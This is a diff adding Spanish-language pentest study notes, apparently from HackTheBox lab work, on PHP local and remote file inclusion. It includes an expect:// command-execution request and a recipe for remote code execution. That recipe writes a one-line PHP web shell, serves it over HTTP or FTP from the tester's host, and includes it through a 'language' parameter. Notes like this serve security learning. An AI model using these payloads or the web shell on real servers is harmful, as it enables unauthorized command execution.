@@ -19,3 +19,16 @@
 GNT@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
+
+## RFI (Remote file inclusion)
+- Permite a un atacante incluir un archivo generalmente explotando la inclusión de un archivo dinamico implementado en el aplicativo.
+- Ocurre cuando en un user input no hay una validación apropiada.
+- en PHP podemos chequearlo con `allow_url_include`, también podemos directamente incluir un URL como payload.
+    - `http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php`
+
+### RCE + RFI
+- `echo '<?php system($_GET["cmd"]); ?>' > shell.php`
+- `python3 -m http.server 80`
+- `http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id`
+- con ftp `python3 -m pyftpdlib -p 21`
+- `http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id`
